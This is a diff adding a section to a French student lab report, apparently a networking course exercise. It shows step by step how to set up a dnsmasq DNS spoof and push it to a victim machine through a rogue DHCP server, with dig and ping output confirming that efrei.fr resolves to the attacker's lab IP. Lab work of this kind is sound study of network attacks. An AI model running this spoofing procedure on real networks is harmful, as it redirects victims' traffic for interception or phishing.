@@ -138,6 +138,144 @@ efrei.fr resolved to 51.210.229.203
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Part4 : Alors koa c tou ? On refé just la mem choz ke o tp1 enfet enfet ? Bah non
+
+## 2. Go for it¶
+A. Setup
+
+🌞 Préparer le DNS spoof
+```sh
+[gustave@localhost ~]$ echo "10.2.1.188 efrei.fr" > /tmp/dns_spoof_hosts
+[gustave@localhost ~]$ cat << EOF > /tmp/dnsmasq.conf
+> interface=enp0s9
+listen-address=10.2.1.188
+port=53
+no-hosts
+addn-hosts=/tmp/dns_spoof_hosts
+no-resolv
+server=1.1.1.1
+server=8.8.8.8
+EOF
+```
+
+B. Vérification¶
+🌞 S'assurer que c'est up & running, on en profite pour réviser un peu de shell
+
+```sh
+
+[gustave@localhost tmp]$ sudo dnsmasq -C /tmp/dnsmasq.conf -q
+[gustave@localhost tmp]$ ps -ef | grep dnsmasq
+dnsmasq     2505       1  0 04:06 ?        00:00:00 dnsmasq -C /tmp/dnsmasq.conf -q
+gustave     2519    1500  0 04:09 pts/2    00:00:00 grep --color=auto dnsmasq
+[gustave@localhost tmp]$ sudo ss -unlp | grep :53
+UNCONN 0      0            0.0.0.0:53        0.0.0.0:*    users:(("dnsmasq",pid=2505,fd=4))
+UNCONN 0      0               [::]:53           [::]:*    users:(("dnsmasq",pid=2505,fd=6))
+```
+
+- DIG1
+```sh
+  [gustave@localhost tmp]$ dig @1.1.1.1 efrei.fr
+
+; <<>> DiG 9.16.23-RH <<>> @1.1.1.1 efrei.fr
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 58280
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1232
+;; QUESTION SECTION:
+;efrei.fr.                      IN      A
+
+;; ANSWER SECTION:
+efrei.fr.               20      IN      A       51.210.229.203
+
+;; Query time: 21 msec
+;; SERVER: 1.1.1.1#53(1.1.1.1)
+;; WHEN: Mon Jan 19 04:12:08 CET 2026
+;; MSG SIZE  rcvd: 53
+```
+
+ - DIG2
+   ```sh
+   [gustave@localhost tmp]$ dig @127.0.0.1 efrei.fr
+   
+    ; <<>> DiG 9.16.23-RH <<>> @127.0.0.1 efrei.fr
+    ; (1 server found)
+    ;; global options: +cmd
+    ;; Got answer:
+    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 39588
+    ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+    
+    ;; OPT PSEUDOSECTION:
+    ; EDNS: version: 0, flags:; udp: 1232
+    ;; QUESTION SECTION:
+    ;efrei.fr.                      IN      A
+    
+    ;; ANSWER SECTION:
+    efrei.fr.               0       IN      A       10.2.1.188
+    
+    ;; Query time: 6 msec
+    ;; SERVER: 127.0.0.1#53(127.0.0.1)
+    ;; WHEN: Mon Jan 19 04:13:50 CET 2026
+    ;; MSG SIZE  rcvd: 53
+   ```
+
+  ## C. Hax ?¶
+  
+C. Hax ?¶
+🌞 Relance ton attaque DHCP spoof depuis la machine attaquante
+```sh
+ option domain-name-servers 10.2.1.188;
+```
+
+🌞 Test test test :
+```sh
+PC7> ip dhcp
+DDORA IP 10.2.1.242/24 GW 10.2.1.188
+PC7> show ip
+
+NAME        : PC7[1]
+IP/MASK     : 10.2.1.242/24
+GATEWAY     : 10.2.1.188
+DNS         : 10.2.1.188
+DHCP SERVER : 10.2.1.188
+DHCP LEASE  : 596, 600/300/525
+MAC         : 00:50:79:66:68:06
+LPORT       : 20031
+RHOST:PORT  : 127.0.0.1:20032
+MTU         : 1500
+
+PC7> ping efrei.fr
+efrei.fr resolved to 10.2.1.188
+
+84 bytes from 10.2.1.188 icmp_seq=1 ttl=64 time=6.389 ms
+84 bytes from 10.2.1.188 icmp_seq=2 ttl=64 time=2.736 ms
+84 bytes from 10.2.1.188 icmp_seq=3 ttl=64 time=2.904 ms
+84 bytes from 10.2.1.188 icmp_seq=4 ttl=64 time=3.114 ms
+84 bytes from 10.2.1.188 icmp_seq=5 ttl=64 time=4.612 ms
+``` 
+   
+
+
+
+
+
+
  
 
 
